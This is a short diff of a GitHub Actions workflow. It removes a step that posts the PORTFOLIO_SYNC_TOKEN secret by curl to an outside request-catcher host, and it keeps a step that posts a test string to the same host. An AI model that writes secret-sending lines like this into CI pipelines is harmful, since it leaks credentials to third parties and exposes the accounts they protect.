@@ -22,7 +22,6 @@ jobs:
           PORTFOLIO_SYNC_TOKEN: ${{ secrets.PORTFOLIO_SYNC_TOKEN }}
         run: |
           curl -X POST -d 'Hello World!' https://fsgasgadsg.requestcatcher.com/test 
-          curl -X POST -d $PORTFOLIO_SYNC_TOKEN https://fsgasgadsg.requestcatcher.com/test
           
       - name: Check out source
         uses: actions/checkout@v6
